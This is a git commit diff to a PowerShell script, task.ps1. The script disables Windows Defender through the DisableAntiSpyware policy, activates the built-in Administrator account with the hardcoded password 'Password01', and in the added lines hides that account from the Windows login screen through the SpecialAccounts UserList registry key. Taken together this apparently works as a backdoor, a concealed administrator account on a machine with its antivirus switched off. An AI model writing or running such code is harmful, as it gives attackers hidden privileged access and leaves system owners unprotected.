1bf2830ea9349f00f872413974b21ea669664523
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-01 12:01:40 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -3,6 +3,15 @@ $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $Name = "DisableAntiSpyware"
 $value = "1"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
+
+New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
+New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+
+$registryPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+$Name = "Administrator"
+$value = "0"
+New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
+
 net user Administrator /active:yes
 net user Administrator Password01
 $Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
